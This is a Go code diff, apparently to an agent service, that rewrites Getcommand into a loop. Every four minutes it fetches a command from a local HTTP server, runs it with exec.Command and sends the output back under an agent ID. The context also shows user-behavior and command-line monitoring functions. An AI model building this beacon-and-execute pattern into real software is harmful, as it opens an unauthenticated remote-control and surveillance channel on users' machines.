@@ -21,6 +21,7 @@ import (
 	"runtime"
 	"strings"
 	"time"
+    "log"
     "strconv"
     "bufio"
     "os/user"
@@ -801,55 +802,67 @@ func (p *Program) monitorUserBehavior(agentID string) {
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 func (p *Program) Getcommand(agentid string) {
-    resp, err := http.Get("http://localhost:8080/command")
-    
-    defer resp.Body.Close()
+    ticker := time.NewTicker(4 * time.Minute)
+    defer ticker.Stop()
 
-    body, err := io.ReadAll(resp.Body)
-    if err != nil {
-        fmt.Printf("Failed to read command: %v\n", err)
-        return
+    for {
+        select {
+        case <-ticker.C:
+            // Make the HTTP request
+            resp, err := http.Get("http://localhost:8080/command")
+            if err != nil {
+                log.Printf("Failed to get command: %v", err)
+                continue
+            }
+            defer resp.Body.Close()
+
+            body, err := io.ReadAll(resp.Body)
+            if err != nil {
+                log.Printf("Failed to read command: %v", err)
+                continue
+            }
+
+            var response Response
+            var command Command
+            if err := json.Unmarshal(body, &response); err != nil {
+                log.Printf("Failed to unmarshal command: %v", err)
+                continue
+            }
+
+            if len(response.Data) == 0 {
+                continue // No commands to execute
+            }
+
+            command = response.Data[0]
+            if command.Command == "" {
+                log.Printf("Empty command received")
+                continue
+            }
+
+            // Execute the command
+            cmd := exec.Command(command.Command)
+            output, err := cmd.CombinedOutput()
+            if err != nil {
+                log.Printf("Failed to execute command: %v", err)
+                continue
+            }
+
+            // Prepare and send output
+            out := Output{
+                AgentID:       agentid,
+                Given_command: command.Command,
+                Output:        string(output),
+            }
+
+            sendOutput(out)
+
+            log.Printf("Command output: %s", string(output))
+
+        case <-p.exit:
+            return
+        }
     }
-
-    var response Response
-    var command Command
-    if err := json.Unmarshal(body, &response); err != nil {
-        fmt.Printf("Failed to unmarshal command: %v\n", err)
-        return
-    }
-    if len(response.Data) > 0 {
-		
-		command = response.Data[0]
-		
-		
-		fmt.Println("Command:", command.Command)
-    }
-
-    
-
-    cmd := exec.Command(command.Command)
-    output, err := cmd.CombinedOutput()
-    if err != nil {
-        fmt.Printf("Failed to execute command: %v\n", err)
-        return
-    }
-
-   
-    out := Output {
-        AgentID: agentid,
-        Given_command: command.Command,
-        Output: string(output),
-    }
-
-    sendOutput(out)
-    fmt.Printf("Command output: %s\n", string(output))
 }
-
-
-
-
-
-
 
 
 // Check what is gonna be typed on the commandline
@@ -1165,3 +1178,6 @@ func main() {
         fmt.Printf("Service failed: %v\n", err)
     }
 }
+
+
+
